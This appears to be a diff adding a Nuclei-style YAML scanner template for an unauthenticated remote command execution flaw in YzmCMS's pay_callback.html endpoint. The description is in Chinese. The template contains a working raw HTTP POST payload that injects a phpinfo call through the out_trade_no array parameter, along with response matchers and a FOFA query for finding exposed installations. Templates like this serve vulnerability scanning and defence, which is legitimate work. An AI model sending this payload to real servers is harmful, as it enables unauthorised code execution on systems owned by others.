@@ -1,0 +1,30 @@
+id: YzmCMS-pay_callback-exec
+
+info:
+  name: YzmCMS pay_callback.html存在远程命令执行漏洞
+  author: Simple
+  severity: high
+  description: |
+    YzmCMS /pay_callback.html接口存在远程命令执行漏洞，未经身份验证的远程攻击者可利用此漏洞执行任意系统命令。
+  reference:
+    - https://github.com/JJThome
+  metadata:
+    fofa-query: app="yzmcms"
+
+http:
+  - raw:
+      - |
+        POST /pay/index/pay_callback.html HTTP/1.1
+        User-Agent: Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36
+        Accept-Encoding: gzip
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        out_trade_no[0]=eq&out_trade_no[1]=1&out_trade_no[2]=phpinfo
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body,"PHP Version")
+        condition: and
